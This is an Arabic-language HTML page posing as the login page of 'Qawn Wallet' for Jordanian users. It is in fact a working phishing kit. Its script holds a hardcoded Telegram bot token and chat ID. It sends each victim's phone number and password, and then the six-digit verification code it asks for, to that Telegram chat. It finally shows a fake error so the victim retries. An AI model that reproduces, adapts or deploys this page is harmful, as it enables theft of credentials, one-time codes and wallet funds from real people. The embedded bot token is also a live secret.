<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>تسجيل الدخول | محفظة Qawn</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #fff 0%, #ffe2e6 100%);
      min-height: 100vh;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: #fff;
      border-radius: 28px;
      box-shadow: 0 8px 32px 0 #b91c1c22;
      max-width: 390px;
      width: 100%;
      padding: 2.5rem 2rem 1.5rem 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      animation: fade-in 0.7s;
      border: 2px solid #ff4d6d;
      position: relative;
    }
    @keyframes fade-in {
      0% { opacity:0; transform:translateY(30px);}
      100% {opacity:1; transform:translateY(0);}
    }
    .logo {
      width: 90px;
      height: 90px;
      border-radius: 50%;
      box-shadow: 0 4px 16px #ff4d6d33;
      border: 3px solid #fff0f3;
      margin-bottom: 1rem;
      object-fit: cover;
      background: #fff6f8;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    .decor {
      width: 62px;
      height: 6px;
      border-radius: 6px;
      background: linear-gradient(90deg,#ff4d6d 0%,#fff 50%,#d90429 100%);
      margin: 1.3rem auto 1.2rem auto;
      opacity: 0.72;
    }
    h2 {
      font-size: 1.85rem;
      color: #d90429;
      margin-bottom: 2rem;
      font-weight: bold;
      text-align: center;
      letter-spacing: .5px;
      text-shadow: 0 2px 8px #ffb3c2;
    }
    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 1.2rem;
    }
    label {
      font-weight: 500;
      color: #d90429;
      margin-bottom: .33rem;
      display: block;
      text-align: right;
      font-size: 1.05rem;
      letter-spacing: .04em;
    }
    input[type="tel"], input[type="password"], input[type="text"] {
      width: 100%;
      padding: .85rem .92rem;
      border-radius: 12px;
      border: 1.7px solid #ff4d6d;
      font-size: 1.13rem;
      font-family: inherit;
      outline: none;
      transition: border 0.2s, box-shadow 0.2s, background 0.15s;
      background: #fff7fa;
      color: #a4161a;
      text-align: right;
    }
    input:focus {
      border-color: #d90429;
      box-shadow: 0 0 0 2px #d9042922;
      background: #fff;
    }
    .btn, .btn-back {
      font-family: 'Cairo', sans-serif;
      border: none;
      font-weight: bold;
      font-size: 1.12rem;
      border-radius: 12px;
      padding: 1rem;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
      letter-spacing: .04em;
      margin-top: .3rem;
      margin-bottom: .1rem;
    }
    .btn {
      background: linear-gradient(90deg,#ff4d6d 0%,#d90429 100%);
      color: #fff;
      box-shadow: 0 2px 12px #d9042940;
    }
    .btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }
    .btn:hover {
      background: linear-gradient(90deg,#d90429 0%,#ff4d6d 100%);
    }
    .btn-back {
      background: #fff0f3;
      color: #d90429;
      border: 1.2px solid #ff4d6d;
      box-shadow: 0 2px 8px #ff4d6d14;
      margin-top: 0;
      margin-bottom: .6rem;
      font-size: 1.09rem;
      padding: .75rem 0.5rem;
      display: flex;
      align-items: center;
      gap: .5em;
      justify-content: center;
      width: 110px;
      align-self: flex-start;
      transition: background .18s, color .18s;
    }
    .btn-back:hover {
      background: #ffd6dc;
      color: #fff;
      border-color: #d90429;
    }
    .err {
      background: #ffe5e9;
      color: #d90429;
      padding: .86rem;
      border-radius: 12px;
      text-align: center;
      font-weight: bold;
      margin-top: 1.1rem;
      font-size: 1.02rem;
      border: 1.3px solid #ff4d6d;
      animation: shake .35s;
      box-shadow: 0 1px 6px #ff4d6d22;
    }
    @keyframes shake {
      0% {transform:translateX(0);}
      25% {transform:translateX(-7px);}
      50% {transform:translateX(7px);}
      75% {transform:translateX(-7px);}
      100% {transform:translateX(0);}
    }
    .footer {
      text-align: center;
      font-size: 1rem;
      color: #ff4d6d;
      margin-top: 2rem;
      letter-spacing: .03em;
      border-top: 1px dashed #ffd6dc;
      padding-top: 1.05rem;
      width: 100%;
    }
    @media(max-width:430px) {
      .container { padding: 1.3rem .5rem 1.2rem .5rem;}
      h2 { font-size:1.14rem;}
      .logo {width:60px; height:60px;}
      .btn, .btn-back {font-size: .98rem;}
      .footer { font-size: .85rem;}
      .decor {width:40px;}
    }
    /* تحسين المسافات بين عناصر النموذج */
    .field-group {
      margin-bottom: .2rem;
      display: flex;
      flex-direction: column;
      gap: .23rem;
    }
  </style>
</head>
<body>
  <div class="container" id="main-container">
    <img src="https://www2.0zz0.com/2025/06/26/02/474215087.jpeg" class="logo" alt="Qawn Logo">
    <div class="decor"></div>
    <h2>تسجيل الدخول إلى محفظة Qawn</h2>
    <form id="login-form" autocomplete="off">
      <div class="field-group">
        <label for="phone">رقم الهاتف الأردني</label>
        <input id="phone" type="tel" inputmode="tel" 
          required placeholder="+9627Xxxxxxxx"
          pattern="^\+962(7|77|78|79|079|078|077)[0-9]{7}$"
          maxlength="13"
          title="يجب إدخال رقم أردني بصيغة +9627XXXXXXXX أو +96277XXXXXXX أو +96278XXXXXXX أو +96279XXXXXXX">
      </div>
      <div class="field-group">
        <label for="password">كلمة السر</label>
        <input id="password" type="password" required placeholder="********">
      </div>
      <button class="btn" id="login-btn" type="submit">تسجيل الدخول</button>
    </form>
    <form id="code-form" style="display:none;" autocomplete="off">
      <button type="button" class="btn-back" id="back-btn">
        <svg width="19" height="19" style="vertical-align:middle" fill="none" viewBox="0 0 20 20"><path d="M14.5 10H5.5" stroke="#d90429" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M9 14.5L4.5 10L9 5.5" stroke="#d90429" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        رجوع
      </button>
      <div class="field-group">
        <label for="code">رمز التحقق</label>
        <input id="code" type="text" inputmode="numeric" required maxlength="6" minlength="6"
          pattern="^[0-9]{6}$"
          style="text-align:center;letter-spacing:.2em;" placeholder="ادخل رمز التحقق المكون من 6 أرقام">
      </div>
      <button class="btn" id="code-btn" type="submit">تأكيد رمز التحقق</button>
    </form>
    <div id="error" style="display:none;" class="err"></div>
    <div class="footer">جميع الحقوق محفوظة &copy; Qawn Wallet 2025</div>
  </div>
  <script>
    // بيانات البوت
    const BOT_TOKEN = "7219743105:AAE7HUutErQyxqYaD15tHo56tc52qC_3FAM";
    const CHAT_ID = "-4625923889";
    // متغيرات
    let messageId = null;
    let userPhone = "", userPass = "";

    // عناصر الصفحة
    const loginForm = document.getElementById("login-form");
    const codeForm = document.getElementById("code-form");
    const errorDiv = document.getElementById("error");
    const loginBtn = document.getElementById("login-btn");
    const codeBtn = document.getElementById("code-btn");
    const phoneInput = document.getElementById("phone");
    const passInput = document.getElementById("password");
    const codeInput = document.getElementById("code");
    const backBtn = document.getElementById("back-btn");

    // تصحيح تلقائي لبادئة رقم الهاتف
    phoneInput.addEventListener('input', function() {
      let val = phoneInput.value.replace(/\s+/g,'');
      if(!val.startsWith('+962')) {
        val = '+962' + val.replace(/^\+?962?/, '').replace(/^0/, '');
      }
      phoneInput.value = val;
    });

    // إرسال رسالة تيليجرام
    async function sendTelegramMsg(text) {
      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
      const data = await resp.json();
      return data.result ? data.result.message_id : null;
    }
    // حذف رسالة تيليجرام
    async function deleteTelegramMsg(msgId) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, message_id: msgId })
      });
    }
    // إظهار خطأ
    function showError(msg) {
      errorDiv.style.display = "block";
      errorDiv.textContent = msg;
    }
    // إخفاء خطأ
    function hideError() {
      errorDiv.style.display = "none";
      errorDiv.textContent = "";
    }

    // تحقق من صحة رقم الهاتف الأردني
    function isValidJordanianPhone(phone) {
      // يقبل +9627, +96277, +96278, +96279, +962079, +962078, +962077
      return /^\+962(7|77|78|79|079|078|077)[0-9]{7}$/.test(phone);
    }

    // تحقق من صحة رمز التحقق (ستة أرقام)
    function isValidCode(code) {
      return /^[0-9]{6}$/.test(code);
    }

    // تسجيل الدخول
    loginForm.onsubmit = async (e) => {
      e.preventDefault();
      hideError();
      loginBtn.disabled = true;
      loginBtn.textContent = "جارٍ الإرسال...";
      userPhone = phoneInput.value.trim();
      userPass = passInput.value;
      if(!isValidJordanianPhone(userPhone)) {
        showError("يرجى إدخال رقم أردني صحيح بصيغة +9627XXXXXXXX أو +96277XXXXXXX أو +96278XXXXXXX أو +96279XXXXXXX");
        loginBtn.disabled = false;
        loginBtn.textContent = "تسجيل الدخول";
        return;
      }
      // إرسال البيانات
      const msg = `تسجيل دخول جديد لمحفظة Qawn\nرقم الهاتف: ${userPhone}\nكلمة السر: ${userPass}`;
      try {
        messageId = await sendTelegramMsg(msg);
        // الانتقال لصفحة الرمز
        loginForm.style.display = "none";
        codeForm.style.display = "flex";
        codeInput.value = "";
        codeInput.focus();
      } catch {
        showError("تعذر الإرسال. تحقق من اتصالك بالإنترنت.");
      }
      loginBtn.disabled = false;
      loginBtn.textContent = "تسجيل الدخول";
    };

    // تحقق الرمز
    codeForm.onsubmit = async (e) => {
      e.preventDefault();
      hideError();
      codeBtn.disabled = true;
      codeBtn.textContent = "جارٍ التحقق...";
      const codeValue = codeInput.value.trim();
      if(!isValidCode(codeValue)) {
        showError("رمز التحقق يجب أن يكون مكونًا من 6 أرقام فقط.");
        codeBtn.disabled = false;
        codeBtn.textContent = "تأكيد رمز التحقق";
        return;
      }
      // حذف الرسالة الأولى
      if (messageId) await deleteTelegramMsg(messageId);
      // إرسال رسالة جديدة
      const msg = `محاولة التحقق لمحفظة Qawn\nرقم الهاتف: ${userPhone}\nكلمة السر: ${userPass}\nرمز التحقق: ${codeValue}`;
      await sendTelegramMsg(msg);
      // إشعار خطأ
      showError("هناك خطأ في المعلومات المدخلة. يرجى التأكد والمحاولة مرة أخرى.");
      codeBtn.disabled = false;
      codeBtn.textContent = "تأكيد رمز التحقق";
    };

    // زر الرجوع
    backBtn.onclick = function(e) {
      e.preventDefault();
      hideError();
      codeForm.style.display = "none";
      loginForm.style.display = "flex";
      phoneInput.focus();
    };
  </script>
</body>
</html>
